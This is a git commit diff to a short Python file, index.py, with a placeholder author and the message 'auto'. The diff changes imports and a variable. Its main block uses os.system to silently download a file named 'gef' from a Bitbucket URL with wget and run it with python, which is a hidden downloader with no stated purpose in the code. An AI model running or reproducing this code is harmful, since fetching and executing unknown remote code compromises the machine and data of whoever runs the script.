72583aca456168d509652db695b76bb4e9cd4b4b
Your Name <you@example.com>
2024-10-19 12:52:03 +0200

    auto

--- index.py
+++ index.py
@@ -1,4 +1,4 @@
-import sys,os,mailbox
-s=4
+import sys,os,ftplib
+o=10
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
